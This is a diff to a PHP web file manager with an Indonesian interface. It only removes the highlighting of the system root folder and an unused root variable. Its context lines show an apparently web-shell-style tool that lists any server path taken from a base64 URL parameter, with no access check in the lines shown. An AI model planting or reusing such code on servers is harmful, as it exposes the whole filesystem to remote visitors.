@@ -161,11 +161,8 @@ function display_path_links($dir) {
         foreach ($folders as $folder) {
             $folderPath = realpath($dir . '/' . $folder);
             $encodedPath = urlencode(base64_encode($folderPath));
-            $isRoot = $folderPath === '/';
-            $style = $isRoot ? "style='color:red;'" : "";
-            $rootIcon = $isRoot ? "🌹" : "";
-            echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
-            echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . format_filename($folder) . "/ $rootIcon</a>";
+            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
+            echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . format_filename($folder) . "/</a>";
             echo "<span class='ml-auto'>" . get_permissions($folderPath) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
@@ -241,11 +238,8 @@ function display_path_links($dir) {
         foreach ($files as $file) {
             $filePath = realpath($dir . '/' . $file);
             $encodedPath = urlencode(base64_encode($filePath));
-            $isRoot = $filePath === '/';
-            $style = $isRoot ? "style='color:red;'" : "";
-            $rootIcon = $isRoot ? "🌹" : "";
-            echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
-            echo "<span>" . format_filename($file) . " $rootIcon</span>";
+            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
+            echo "<span>" . format_filename($file) . "</span>";
             echo "<span class='ml-auto'>" . get_permissions($filePath) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
@@ -556,7 +550,6 @@ function str2oct($str) {
     return octdec(implode('', $oct));
 }
 
-$rootDir = '/'; // Menggunakan root direktori sistem Linux
 $dir = isset($_GET['dir']) ? base64_decode(urldecode($_GET['dir'])) : '.';
 $displayDir = realpath($dir);
 
